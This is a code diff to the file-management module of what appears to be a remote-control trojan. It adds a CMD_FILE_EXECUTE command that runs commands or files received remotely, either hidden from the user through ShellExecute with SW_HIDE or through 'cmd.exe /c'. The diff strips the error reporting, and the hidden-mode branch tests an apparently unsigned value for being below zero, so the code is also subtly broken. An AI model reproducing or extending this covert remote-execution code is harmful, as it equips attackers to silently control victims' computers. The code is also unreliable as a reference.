@@ -79,6 +79,11 @@ DWORD MainFileManage()
 				deleteDirectory(chBuffer);
 			}
 			break;
+		case CMD_FILE_EXECUTE:
+			{
+				FileExec(chBuffer, &msgHead);
+			}
+			break;
 		default:
 			{
 
@@ -287,52 +292,38 @@ void deleteDirectory(CString directoryPath)   //删除一个文件夹下的所有内容
 			fileDelete((LPSTR)(LPCSTR)finder.GetFilePath());
 		}
 	}
-	 RemoveDirectory(directoryPath);
+	RemoveDirectory(directoryPath);
 	finder.Close();
 }
 
-/*
+
 void FileExec(char *pBuf, LPMsgHead lpMsgHead)
 {
-FileOpt m_FileOpt;
-memcpy(&m_FileOpt, pBuf, sizeof(m_FileOpt));
+	//隐藏执行
+	if(lpMsgHead->dwExtend1 < 0){
+		HINSTANCE hInst = ::ShellExecute(NULL, "open",pBuf, NULL,NULL, SW_HIDE);
+	}
+	else {
+		//正常执行
+		char szCmd[512] = {0};
+		wsprintf(szCmd, "cmd.exe /c \"%s\"", pBuf);
+		PROCESS_INFORMATION ProcessInfo; 
+		STARTUPINFOA StartupInfo; //This is an [in] parameter
+		ZeroMemory(&StartupInfo, sizeof(StartupInfo));
+		StartupInfo.cb          = sizeof(StartupInfo); //Only compulsory field
+		StartupInfo.lpDesktop   = "WinSta0\\Default";
+		StartupInfo.dwFlags     = STARTF_USESHOWWINDOW; 
+		StartupInfo.wShowWindow = SW_SHOW;
 
-if (m_FileOpt.iSize < 0)//隐藏运行
-{
-HINSTANCE hInst = ::ShellExecute(NULL, "open",m_FileOpt.cScrFile, NULL,NULL, SW_HIDE);
-if ((INT)hInst < 32)//若返回值小于32出现错误
-lpMsgHead->dwCmd  = CMD_FAILED;
-else
-lpMsgHead->dwCmd  = CMD_SUCCEED;
-lpMsgHead->dwSize = 0;	
-}
-else
-{
-char szCmd[512] = {0};
-wsprintf(szCmd, "cmd.exe /c \"%s\"", m_FileOpt.cScrFile);
-PROCESS_INFORMATION ProcessInfo; 
-STARTUPINFOA StartupInfo; //This is an [in] parameter
-ZeroMemory(&StartupInfo, sizeof(StartupInfo));
-StartupInfo.cb          = sizeof(StartupInfo); //Only compulsory field
-StartupInfo.lpDesktop   = "WinSta0\\Default";
-StartupInfo.dwFlags     = STARTF_USESHOWWINDOW; 
-StartupInfo.wShowWindow = SW_SHOW;
-
-if(CreateProcess(NULL, szCmd, 
-NULL,NULL,FALSE,0,NULL,
-"c:\\",&StartupInfo,&ProcessInfo))
-{
-CloseHandle(ProcessInfo.hThread);
-CloseHandle(ProcessInfo.hProcess);
-
-lpMsgHead->dwCmd  = CMD_SUCCEED;
-}
-else
-lpMsgHead->dwCmd  = CMD_FAILED;
-lpMsgHead->dwSize = 0;	
-}
+		CreateProcess(NULL, szCmd, 
+			NULL,NULL,FALSE,0,NULL,
+			"c:\\",&StartupInfo,&ProcessInfo);
+		CloseHandle(ProcessInfo.hThread);
+		CloseHandle(ProcessInfo.hProcess);
+	}
 }
 
+/*
 void FilePaste(char *pBuf, LPMsgHead lpMsgHead)
 {
 FileOpt m_FileOpt;
